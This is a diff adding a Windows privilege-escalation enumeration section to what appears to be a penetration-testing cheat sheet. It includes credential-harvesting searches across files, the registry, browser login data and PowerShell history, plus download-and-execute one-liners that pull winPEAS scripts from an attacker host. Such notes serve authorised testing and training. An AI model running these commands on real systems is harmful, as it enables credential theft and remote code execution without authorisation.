@@ -100,3 +100,106 @@ Environment Variables
 
        find / -type f -iname ".env" 2>/dev/null
        grep -i "password" $(find / -type f -iname ".env" 2>/dev/null)
+
+### 2) Windows Local Privilege Escalation LPE Enumeration
+
+On Windows machines, we can conduct some checks to find interesting info for LPE
+
+1) Windows Privileges
+
+Check our current user what privileges does he have
+
+       whoami /priv
+
+More details about the user
+
+       whoami /all
+
+2) Open ports/services that we can use
+
+       netstat -ano
+
+3) Search for passwords within a Windows system
+
+Search for passwords in files
+
+       Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -SimpleMatch
+
+Sensitive Keywords in documents
+
+       Get-ChildItem -Path C:\ -Include *.txt,*.doc,*.docx,*.xls,*.xlsx -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|secret|key|token"
+       findstr /SIM /C:"password" *.txt *ini *.cfg *.config *.xml	
+
+Config files containing credentials
+
+       Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password" -Include *.config,*.xml
+
+Browser Password Files
+
+       Get-ChildItem -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -ErrorAction SilentlyContinue
+
+Windows Registry
+
+       reg query HKCU /f "password" /t REG_SZ /s
+       reg query HKLM /f "password" /t REG_SZ /s
+
+User Profiles
+
+       Get-ChildItem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password|pass|key|secret"
+
+Encrypted Vaults
+
+       Get-ChildItem -Path C:\ -Include *.pfx,*.key,*.crt,*.pem -Recurse -ErrorAction SilentlyContinue
+
+System Logs
+
+       Get-Content C:\Windows\System32\LogFiles -ErrorAction SilentlyContinue | Select-String -Pattern "password|key|secret"
+
+3) Automation
+
+Tools: PowerSharpPack, WinPEAS, Invoke-winPEAS
+
+       iex(new-object net.webclient).downloadstring('http://ATTACK_IP:PORT/PowerSharpPack.ps1')
+
+       PowerSharpPack -winPEAS
+
+OR 
+
+       iex(new-object net.webclient).downloadstring('http://10.10.14.5:9999/Invoke-winPEAS.ps1')
+
+       Invoke-winPEAS >> .out
+
+4) Unquoted Services Paths
+
+       cmd /c wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """
+
+5) AlwaysInstallElevated registry key
+
+       reg query HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer
+       reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
+
+6) Scheduled Tasks
+
+       schtasks /query /fo LIST /v
+       Get-ScheduledTask | select TaskName,State
+
+7) User Enumeration
+
+       net users
+       Get-LocalUser
+
+8) Windows version
+
+       systeminfo
+
+9) Powershell History
+
+Confirm powershell history save path
+
+       (Get-PSReadLineOption).HistorySavePath	
+
+Read powershell history file
+
+       gc (Get-PSReadLineOption).HistorySavePath	
+
+Tools: SessionGopher, LaZagne https://github.com/Arvanaghi/SessionGopher
